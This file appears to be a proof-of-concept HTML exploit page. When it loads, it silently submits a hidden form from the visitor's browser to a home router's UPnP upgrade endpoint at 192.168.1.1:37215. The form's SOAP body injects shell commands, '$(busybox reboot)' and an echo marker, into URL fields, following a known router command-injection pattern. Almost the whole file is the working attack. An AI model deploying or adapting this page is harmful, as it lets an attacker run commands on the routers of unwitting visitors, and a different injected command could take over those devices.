web_exploit/poc_iframe.html

<html>
    <Head>
        <title>Iframe Page</title>
    </Head>
    <body>
        <form id="form1" style="display:none;" action="http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1" enctype="text/plain" method="POST">
            <textarea type="hidden" rows="50" cols="100" name="&lt;?xml version">&quot;1.0&quot; ?&gt;
                &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
                    &lt;s:Body&gt;
                        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;
                            &lt;NewStatusURL&gt;http://$(busybox reboot)&lt;/NewStatusURL&gt;
                            &lt;NewDownloadURL&gt;http://$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;
                        &lt;/u:Upgrade&gt;
                    &lt;/s:Body&gt;
                &lt;/s:Envelope&gt;
            </textarea>
        </form>
        <script>
            document.getElementById('form1').submit();
        </script>
    </body>
</html>
